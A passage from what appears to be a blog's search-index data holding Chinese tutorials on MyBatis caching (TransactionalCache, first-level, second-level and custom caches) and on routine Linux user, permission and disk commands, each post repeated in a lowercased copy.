commit() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.commit();\n        }\n    }\n\n    /**\n     * 回滚时全部回滚\n     */\n    public void rollback() {\n        for (transactionalcache txcache : transactionalcaches.values()) {\n            txcache.rollback();\n        }\n    }\n\n    private transactionalcache gettransactionalcache(cache cache) {\n        transactionalcache txcache = transactionalcaches.get(cache);\n        if (txcache == null) {\n            txcache = new transactionalcache(cache);\n            transactionalcaches.put(cache, txcache);\n        }\n        return txcache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class transactionalcache implements cache {\n\n    private cache delegate;\n    // commit 时要不要清缓存\n    private boolean clearoncommit;\n    // commit 时要添加的元素\n    private map<object, object> entriestoaddoncommit;\n    private set<object> entriesmissedincache;\n\n    public transactionalcache(cache delegate) {\n        // delegate = fifocache\n        this.delegate = delegate;\n        // 默认 commit 时不清缓存\n        this.clearoncommit = false;\n        this.entriestoaddoncommit = new hashmap<>();\n        this.entriesmissedincache = new hashset<>();\n    }\n\n    @override\n    public string getid() {\n        return delegate.getid();\n    }\n\n    @override\n    public int getsize() {\n        return delegate.getsize();\n    }\n\n    @override\n    public object getobject(object key) {\n        // key：cachekey 拼装后的哈希码\n        object object = delegate.getobject(key);\n        if (object == null) {\n            entriesmissedincache.add(key);\n        }\n        return clearoncommit ? null : object;\n    }\n\n    @override\n    public void putobject(object key, object object) {\n        entriestoaddoncommit.put(key, object);\n    }\n\n    @override\n    public object removeobject(object key) {\n        return null;\n    }\n\n    @override\n    public void clear() {\n        clearoncommit = true;\n        entriestoaddoncommit.clear();\n    }\n\n    public void commit() {\n        if (clearoncommit) {\n            delegate.clear();\n        }\n        flushpendingentries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockmissedentries();\n        reset();\n    }\n\n    private void reset() {\n        clearoncommit = false;\n        entriestoaddoncommit.clear();\n        entriesmissedincache.clear();\n    }\n\n    /**\n     * 刷新数据到 mappedstatement#cache 中，也就是把数据填充到 mapper xml 级别下。\n     * flushpendingentries 方法把事务缓存下的数据，填充到 fifocache 中。\n     */\n    private void flushpendingentries() {\n        for (map.entry<object, object> entry : entriestoaddoncommit.entryset()) {\n            delegate.putobject(entry.getkey(), entry.getvalue());\n        }\n        for (object entry : entriesmissedincache) {\n            if (!entriestoaddoncommit.containskey(entry)) {\n                delegate.putobject(entry, null);\n            }\n        }\n    }\n\n    private void unlockmissedentries() {\n        for (object entry : entriesmissedincache) {\n            delegate.putobject(entry, null);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n其实上面饶了一圈下来，最终操作的是 mappedstatement 维护的 cache 对象， mappedstatement 是被全局 configuration 在缓存的，所以查询结束不会清除 mappedstatement 对象和缓存信息，只有当触发 update，commit，rollback 等才会清除 mappedstatement 里维护的缓存信息',charsets:{cjk:!0}},{title:"MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存",frontmatter:{title:"MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/303/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/30.Mybatis/31.mybatis/303.MyBatis%20Plus+Spring%20Boot%20%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%BA%8C%E7%BA%A7%E7%BC%93%E5%AD%98%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BC%93%E5%AD%98.html",relativePath:"00.java/30.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存.md",key:"v-74f21a38",path:"/mybatis/mybatis/303/",headers:[{level:2,title:"一级缓存",slug:"一级缓存",normalizedTitle:"一级缓存",charIndex:2},{level:2,title:"二级缓存",slug:"二级缓存",normalizedTitle:"二级缓存",charIndex:667},{level:2,title:"自定义缓存",slug:"自定义缓存",normalizedTitle:"自定义缓存",charIndex:1802}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"一级缓存 二级缓存 自定义缓存",content:'# 一级缓存\n\n首先需要在 application.yml 中进行配置\n\nmybatis-plus:\n  # 指定具体xml路径 全路径\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*Mapper.xml\n  # 设置实体路径位置\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # 开启一级缓存,默认是开启的\n    local-cache-scope: SESSION\n  GlobalConfig:\n    # 关闭 banner 效果\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n其次在查询方法上使用注解 @Transactional，@Transactional 代表就像一个 session，我们在这里面重复执行查询，就只会查询一次\n\n@Transactional\n@GetMapping("/testOne")\npublic UserBean testOne(){\n    UserBean userBean = cacheOneMapper.testOne();\n    userBean = null;\n    userBean = cacheOneMapper.testOne();\n    return userBean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 二级缓存\n\n首先，在 application.yml 配置文件中添加如下配置：\n\nmybatis-plus:\n  configuration:\n    # 开启二级缓存\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\n必须实现要给对象进行 Serializable，例如：\n\n@Data\n@TableName("user")\npublic class UserBean implements Serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\n最后，需要在 Mapper 接口中使用 @CacheNamespace ，使用该注解可以方便地为每个 Mapper 接口定义独立的缓存空间，并指定不同的缓存实现和缓存策略，从而更好地控制缓存效果。\n\n@Mapper\n@CacheNamespace(eviction = FifoCache.class)\npublic interface CacheTwoMapper extends BaseMapper<UserBean> {\n    List<UserBean> testAll();\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n但如果 Mapper 接口有对应的 XML，则需要在 XML 描述 cache，使用注解 @CacheNamespace 就会失效，两个一起存在就会报错\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.CacheTwoMapper">\n    <cache eviction="fifo"/>\n    <select id="testAll" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user\n    </select>\n    <select id="testOne" resultType="com.fengqianrun.mybatisplus.bean.UserBean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n二级缓存默认情况下是使用 MyBatis 自带的 PerpetualCache 实现，可以通过配置文件中的属性来设置缓存实现类和其他参数。另外，在使用二级缓存时，\n需要注意避免数据并发更新导致脏数据的问题，可以通过设置缓存刷新时间等方式来解决这个问题。\n\n\n# 自定义缓存\n\n如果你是但应用程序的话，使用以上的配置方式没有问题，但如果你是分布式或微服务，那么就会造成数据不一致的问题，此时我们需要借助其他缓存，比如 Redis 来缓存我们的查询数据。自定义缓存也只是在二级缓存基础上的改造，所以规则和二级缓存一样。\n\n实现 org.apache.ibatis.cache.Cache 类\n\npublic class MyCache implements Cache {\n\n    /**\n     * id 会是 mapper 接口的名称\n     */\n    private final String id;\n\n    /**\n     * 可以替换为 Redis\n     */\n    private Map<Object, Object> cache = new ConcurrentHashMap<Object, Object>();\n\n    public MyCache(String id) {\n        this.id = id;\n    }\n\n    /**\n     * 缓存唯一标识\n     * @return\n     */\n    @Override\n    public String getId() {\n        return id;\n    }\n\n    /**\n     * 将键值对放入缓存中\n     * @param key\n     * @param value\n     */\n    @Override\n    public void putObject(Object key, Object value) {\n        System.out.println("添加-自定义缓存: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * 从缓存中获取指定键的值\n     * @param key\n     */\n    @Override\n    public Object getObject(Object key) {\n        System.out.println("查询-自定义缓存: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * 从缓存中移除指定键的值\n     * @param key\n     */\n    @Override\n    public Object removeObject(Object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * 清空缓存\n     */\n    @Override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * 获取缓存中键值对的数量\n     * @return\n     */\n    @Override\n    public int getSize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n具体的 mapper\n\n@Mapper\n@CacheNamespace(implementation = MyCache.class,eviction = FifoCache.class)\npublic interface CacheThreeMapper extends BaseMapper<UserBean> {\n\n    @Select("select * from user")\n    List<UserBean> testAll();\n\n    @Select("select * from user where id = 1")\n    UserBean testOne();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> 我们还可以在 mapper 接口上加 @CacheNamespaceRef 注解，当我们在一个 Mapper 接口中需要使用其他 Mapper 接口所定义的缓存时，可以通过 @CacheNamespaceRef 注解来实现。该注解用于指定另一个 Mapper 接口的 Class 对象，表示当前 Mapper 接口需要引用该接口所定义的缓存命名空间。@CacheNamespaceRef (XXXXXMapper.class)',normalizedContent:'# 一级缓存\n\n首先需要在 application.yml 中进行配置\n\nmybatis-plus:\n  # 指定具体xml路径 全路径\n  mapper-locations: classpath*:/com/fengqianrun/mybatisplus/**/*mapper.xml\n  # 设置实体路径位置\n  type-aliases-package: com.fengqianrun.mybatisplus.bean\n  configuration:\n    # 开启一级缓存,默认是开启的\n    local-cache-scope: session\n  globalconfig:\n    # 关闭 banner 效果\n    banner: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n其次在查询方法上使用注解 @transactional，@transactional 代表就像一个 session，我们在这里面重复执行查询，就只会查询一次\n\n@transactional\n@getmapping("/testone")\npublic userbean testone(){\n    userbean userbean = cacheonemapper.testone();\n    userbean = null;\n    userbean = cacheonemapper.testone();\n    return userbean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 二级缓存\n\n首先，在 application.yml 配置文件中添加如下配置：\n\nmybatis-plus:\n  configuration:\n    # 开启二级缓存\n    cache-enabled: true\n\n\n1\n2\n3\n4\n\n\n必须实现要给对象进行 serializable，例如：\n\n@data\n@tablename("user")\npublic class userbean implements serializable {\n    // ...\n}\n\n\n1\n2\n3\n4\n5\n\n\n最后，需要在 mapper 接口中使用 @cachenamespace ，使用该注解可以方便地为每个 mapper 接口定义独立的缓存空间，并指定不同的缓存实现和缓存策略，从而更好地控制缓存效果。\n\n@mapper\n@cachenamespace(eviction = fifocache.class)\npublic interface cachetwomapper extends basemapper<userbean> {\n    list<userbean> testall();\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n但如果 mapper 接口有对应的 xml，则需要在 xml 描述 cache，使用注解 @cachenamespace 就会失效，两个一起存在就会报错\n\n<mapper namespace="com.fengqianrun.mybatisplus.cache2.cachetwomapper">\n    <cache eviction="fifo"/>\n    <select id="testall" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user\n    </select>\n    <select id="testone" resulttype="com.fengqianrun.mybatisplus.bean.userbean">\n        select * from user where id = 1\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n二级缓存默认情况下是使用 mybatis 自带的 perpetualcache 实现，可以通过配置文件中的属性来设置缓存实现类和其他参数。另外，在使用二级缓存时，\n需要注意避免数据并发更新导致脏数据的问题，可以通过设置缓存刷新时间等方式来解决这个问题。\n\n\n# 自定义缓存\n\n如果你是但应用程序的话，使用以上的配置方式没有问题，但如果你是分布式或微服务，那么就会造成数据不一致的问题，此时我们需要借助其他缓存，比如 redis 来缓存我们的查询数据。自定义缓存也只是在二级缓存基础上的改造，所以规则和二级缓存一样。\n\n实现 org.apache.ibatis.cache.cache 类\n\npublic class mycache implements cache {\n\n    /**\n     * id 会是 mapper 接口的名称\n     */\n    private final string id;\n\n    /**\n     * 可以替换为 redis\n     */\n    private map<object, object> cache = new concurrenthashmap<object, object>();\n\n    public mycache(string id) {\n        this.id = id;\n    }\n\n    /**\n     * 缓存唯一标识\n     * @return\n     */\n    @override\n    public string getid() {\n        return id;\n    }\n\n    /**\n     * 将键值对放入缓存中\n     * @param key\n     * @param value\n     */\n    @override\n    public void putobject(object key, object value) {\n        system.out.println("添加-自定义缓存: "+key+"  "+value);\n        cache.put(key, value);\n    }\n\n    /**\n     * 从缓存中获取指定键的值\n     * @param key\n     */\n    @override\n    public object getobject(object key) {\n        system.out.println("查询-自定义缓存: "+key);\n        return cache.get(key);\n    }\n\n    /**\n     * 从缓存中移除指定键的值\n     * @param key\n     */\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n\n    /**\n     * 清空缓存\n     */\n    @override\n    public void clear() {\n        cache.clear();\n    }\n\n    /**\n     * 获取缓存中键值对的数量\n     * @return\n     */\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n\n\n具体的 mapper\n\n@mapper\n@cachenamespace(implementation = mycache.class,eviction = fifocache.class)\npublic interface cachethreemapper extends basemapper<userbean> {\n\n    @select("select * from user")\n    list<userbean> testall();\n\n    @select("select * from user where id = 1")\n    userbean testone();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> 我们还可以在 mapper 接口上加 @cachenamespaceref 注解，当我们在一个 mapper 接口中需要使用其他 mapper 接口所定义的缓存时，可以通过 @cachenamespaceref 注解来实现。该注解用于指定另一个 mapper 接口的 class 对象，表示当前 mapper 接口需要引用该接口所定义的缓存命名空间。@cachenamespaceref (xxxxxmapper.class)',charsets:{cjk:!0}},{title:"linux 创建用户及权限操作",frontmatter:{title:"linux 创建用户及权限操作",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2300",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2300.Linux%20%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%8F%8A%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C.html",relativePath:"01.运维/2300.linux/2300.Linux 创建用户及权限操作.md",key:"v-9d02e050",path:"/linux/2300/",headers:[{level:2,title:"用户",slug:"用户",normalizedTitle:"用户",charIndex:2},{level:3,title:"usermod",slug:"usermod",normalizedTitle:"usermod",charIndex:512},{level:2,title:"用户组 group",slug:"用户组-group",normalizedTitle:"用户组 group",charIndex:1095},{level:2,title:"文件权限 chown",slug:"文件权限-chown",normalizedTitle:"文件权限 chown",charIndex:1635},{level:2,title:"chmod",slug:"chmod",normalizedTitle:"chmod",charIndex:2059}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"用户 usermod 用户组 group 文件权限 chown chmod",content:'# 用户\n\n关于 useradd 的某些参数：\n\n * -u UID：指定 UID，这个 UID 必须是大于等于 500，并没有其他用户占用的 UID\n * -g GID/GROUPNAME：指定默认组，可以是 GID 或者 GROUPNAME，同样也必须真实存在\n * -G GROUPS：指定附加组\n * -c COMMENT：指定用户的注释信息\n * -d PATH：指定用户的家目录\n\n> -g 基本组：如果没有指定用户组，创建用户的时候系统会默认同时创建一个和这个用户名同名的组，这个组就是基本组，不可以把用户从基本组中删除。在创建文件时，文件的所属组就是用户的基本组。\n> -G 附加组：除了基本组之外，用户所在的其他组，都是附加组。用户是可以从附加组中被删除的。\n> 用户不论为与基本组中还是附加组中，就会拥有该组的权限。一个用户可以属于多个附加组。但是一个用户只能有一个基本组。\n\n查看所有用户\n\ncat /etc/passwd\n\n\n1\n\n\n添加\n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\n删除用户及关联的目录\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod 命令用于修改用户帐号。\n\n * -c <备注> 　修改用户帐号的备注文字。\n * -d 登入目录 > 　修改用户登入时的目录。\n * -e <有效期限> 　修改帐号的有效期限。\n * -f <缓冲天数> 　修改在密码过期后多少天即关闭该帐号。\n * -g <主组> 　修改用户所属主组。\n * -G <群组> 　修改用户所属的附加群组。\n * -l <帐号名称> 　修改用户帐号名称。\n * -L 锁定用户密码，使密码无效。\n * -s 修改用户登入后所使用的 shell。\n * -u 修改用户 ID。\n * -U 解除密码锁定。\n * -a 代表 append，也就是将用户添加到新用户组中而不必离开原有的其他用户组\n\n将 xulei 添加到 root 组\n\nusermod -g root xulei\n\n\n1\n\n\n如果添加的用户不能通过 ssh 登录，可以查看用户受否有 bash 权限\n\n# 查看所有用户，可以查看用户是否有如下路径\ncat /etc/passwd\n# 修改用户有 /bin/bash 权限\nusermod -s /bin/bash 用户名\n# 禁止用户有 /bin/bash 改为 /sbin/nologin\nusermod -s /sbin/nologin 用户名\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 用户组 group\n\n关于组的增加和删除信息会在 etc 目录的 group 文件中找到，命令 cat /etc/group 可以看到自己的分组和分组 id，0 表示管理员（root），1 - 500 表示系统用户。\n\ngroupadd 命令 语法格式如下：\n\n * -g：指定新建工作组的 id；\n * -r：创建系统工作组，系统工作组的组 ID 小于 500；\n * -K：覆盖配置文件 "/ect/login.defs"；\n * -o：允许添加组 ID 号不唯一的工作组。\n * -f,--force: 如果指定的组已经存在，此选项将失明了仅以成功状态退出。当与 -g 一起使用，并且指定的 GID_MIN 已经存在时，选择另一个唯一的 GID（即 - g 关闭）。\n\n查看所有组\n\ncat /etc/group\n\n\n1\n\n\n查看当前组\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\n查看用户所属组\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\n删除组\n\ngroupdel xulei\n\n\n1\n\n\n添加额外组\n\nusermod -a -G 组名称 用户名\n\n\n1\n\n\n\n# 文件权限 chown\n\n用来更改某个目录或文件的用户名和用户组。\n\n * user : 新的档案拥有者的使用者 ID\n * group : 新的档案拥有者的使用者群体 (group)\n * -c : 若该档案拥有者确实已经更改，才显示其更改动作\n * -f : 若该档案拥有者无法被更改也不要显示错误讯息\n * -h : 只对于连结 (link) 进行变更，而非该 link 真正指向的档案\n * -v : 显示拥有者变更的详细资料\n * -R : 对目前目录下的所有档案与子目录进行相同的拥有者变更 (即以递回的方式逐个变更)\n * --help : 显示辅助说明\n * --version : 显示版本\n\n修改 abc 文件的所有者\n\nchown root abc\n\n\n1\n\n\n把目录 /demo 及其下的所有文件和子目录的所有人改成 root，所属组改成 roota。\n\nchown -R root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- 一共 10 个字符，下面讲解下：\n\n * d 表示目录，如果是 - 表示是一个普通文件。剩余的 9 个字符，分成 3 组，每组 3 个字符，分别表示 user/group/others 的 rwx 权限；\n * u user 表示拥有者，可以看到拥有者是 xulei 用户，但文件还属于 root 组，因此 xulei 还是无法执行该文件。\n * g group 表示组，除了 mysql 这个人的 同一个 MySQL 组拥有的权力\n * o others 就是其他人了，啥权限也没有。\n * a 表示 “所有 (all) 用户”。它是系统默认值。\n\n[root@node102 sh]# chmod a+rwx checkLogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 Jan 19 17:31 checkLogin.sh\n-rwxr--r--. 1 root  root 123 Sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 Nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',normalizedContent:'# 用户\n\n关于 useradd 的某些参数：\n\n * -u uid：指定 uid，这个 uid 必须是大于等于 500，并没有其他用户占用的 uid\n * -g gid/groupname：指定默认组，可以是 gid 或者 groupname，同样也必须真实存在\n * -g groups：指定附加组\n * -c comment：指定用户的注释信息\n * -d path：指定用户的家目录\n\n> -g 基本组：如果没有指定用户组，创建用户的时候系统会默认同时创建一个和这个用户名同名的组，这个组就是基本组，不可以把用户从基本组中删除。在创建文件时，文件的所属组就是用户的基本组。\n> -g 附加组：除了基本组之外，用户所在的其他组，都是附加组。用户是可以从附加组中被删除的。\n> 用户不论为与基本组中还是附加组中，就会拥有该组的权限。一个用户可以属于多个附加组。但是一个用户只能有一个基本组。\n\n查看所有用户\n\ncat /etc/passwd\n\n\n1\n\n\n添加\n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\n删除用户及关联的目录\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod 命令用于修改用户帐号。\n\n * -c <备注> 　修改用户帐号的备注文字。\n * -d 登入目录 > 　修改用户登入时的目录。\n * -e <有效期限> 　修改帐号的有效期限。\n * -f <缓冲天数> 　修改在密码过期后多少天即关闭该帐号。\n * -g <主组> 　修改用户所属主组。\n * -g <群组> 　修改用户所属的附加群组。\n * -l <帐号名称> 　修改用户帐号名称。\n * -l 锁定用户密码，使密码无效。\n * -s 修改用户登入后所使用的 shell。\n * -u 修改用户 id。\n * -u 解除密码锁定。\n * -a 代表 append，也就是将用户添加到新用户组中而不必离开原有的其他用户组\n\n将 xulei 添加到 root 组\n\nusermod -g root xulei\n\n\n1\n\n\n如果添加的用户不能通过 ssh 登录，可以查看用户受否有 bash 权限\n\n# 查看所有用户，可以查看用户是否有如下路径\ncat /etc/passwd\n# 修改用户有 /bin/bash 权限\nusermod -s /bin/bash 用户名\n# 禁止用户有 /bin/bash 改为 /sbin/nologin\nusermod -s /sbin/nologin 用户名\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 用户组 group\n\n关于组的增加和删除信息会在 etc 目录的 group 文件中找到，命令 cat /etc/group 可以看到自己的分组和分组 id，0 表示管理员（root），1 - 500 表示系统用户。\n\ngroupadd 命令 语法格式如下：\n\n * -g：指定新建工作组的 id；\n * -r：创建系统工作组，系统工作组的组 id 小于 500；\n * -k：覆盖配置文件 "/ect/login.defs"；\n * -o：允许添加组 id 号不唯一的工作组。\n * -f,--force: 如果指定的组已经存在，此选项将失明了仅以成功状态退出。当与 -g 一起使用，并且指定的 gid_min 已经存在时，选择另一个唯一的 gid（即 - g 关闭）。\n\n查看所有组\n\ncat /etc/group\n\n\n1\n\n\n查看当前组\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\n查看用户所属组\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\n删除组\n\ngroupdel xulei\n\n\n1\n\n\n添加额外组\n\nusermod -a -g 组名称 用户名\n\n\n1\n\n\n\n# 文件权限 chown\n\n用来更改某个目录或文件的用户名和用户组。\n\n * user : 新的档案拥有者的使用者 id\n * group : 新的档案拥有者的使用者群体 (group)\n * -c : 若该档案拥有者确实已经更改，才显示其更改动作\n * -f : 若该档案拥有者无法被更改也不要显示错误讯息\n * -h : 只对于连结 (link) 进行变更，而非该 link 真正指向的档案\n * -v : 显示拥有者变更的详细资料\n * -r : 对目前目录下的所有档案与子目录进行相同的拥有者变更 (即以递回的方式逐个变更)\n * --help : 显示辅助说明\n * --version : 显示版本\n\n修改 abc 文件的所有者\n\nchown root abc\n\n\n1\n\n\n把目录 /demo 及其下的所有文件和子目录的所有人改成 root，所属组改成 roota。\n\nchown -r root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- 一共 10 个字符，下面讲解下：\n\n * d 表示目录，如果是 - 表示是一个普通文件。剩余的 9 个字符，分成 3 组，每组 3 个字符，分别表示 user/group/others 的 rwx 权限；\n * u user 表示拥有者，可以看到拥有者是 xulei 用户，但文件还属于 root 组，因此 xulei 还是无法执行该文件。\n * g group 表示组，除了 mysql 这个人的 同一个 mysql 组拥有的权力\n * o others 就是其他人了，啥权限也没有。\n * a 表示 “所有 (all) 用户”。它是系统默认值。\n\n[root@node102 sh]# chmod a+rwx checklogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 jan 19 17:31 checklogin.sh\n-rwxr--r--. 1 root  root 123 sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',charsets:{cjk:!0}},{title:"Linux 磁盘操作相关命令",frontmatter:{title:"Linux 磁盘操作相关命令",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2301",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/2300.linux/2301.Linux%20%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.html",relativePath:"01.运维/2300.linux/2301.Linux 磁盘操作相关命令.md",key:"v-541435c6",path:"/linux/2301/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:"Df 命令是 linux 系统以磁盘分区为单位查看文件系统，可以加上参数查看磁盘剩余空间信息，命令格式位 df -h ，显示内容如下：\n\nFILESYSTEM   SIZE   USED   AVAIL   USE%   MOUNTED ON\n文件系统         容量     可用     Use%    已用 %   挂载点\n/dev/hda2    45G    19G    24G     44%    /\n/dev/hda1    494M   19M    450M    4%     /boot\n\n查看磁盘剩余空间 df -hl\n\n[root@localhost /]# df -hl\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n查看每个根路径的分区大小 df -h\n\n[root@localhost /]# df -h\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n返回该目录的大小 du -sh [目录名]\n\n[root@localhost /]# du -sh /root\n803M    /root\n\n\n1\n2\n\n\n返回该文件夹总 M 数 du -sm [文件夹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\n查看指定文件夹下的所有文件大小（包含子文件夹) du -h [目录名]\n\n[root@localhost /]# du -h /root\n12K     /root/redis-6.0.5/utils/hyperloglog\n20K     /root/redis-6.0.5/utils/lru\n20K     /root/redis-6.0.5/utils/releasetools\n12K     /root/redis-6.0.5/utils/srandmember\n164K    /root/redis-6.0.5/utils\n71M     /root/redis-6.0.5\n803M    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n产看文件属于哪个磁盘 df -h [目录]\n\n//没有挂载磁盘的目录，显示在系统盘\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /alidata/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vda1        40G  4.6G   33G  13% /\n\n\n1\n2\n3\n4\n\n\n//挂载了磁盘的目录，显示在数据盘分区vdb1\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /mnt/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vdb1        20G   45M   19G   1% /mnt\n\n\n1\n2\n3\n4\n\n\n在显示结果中的 Filesystem 和 Mounted on，这两列就是这个目录所属的磁盘分区。\n因为 Linux 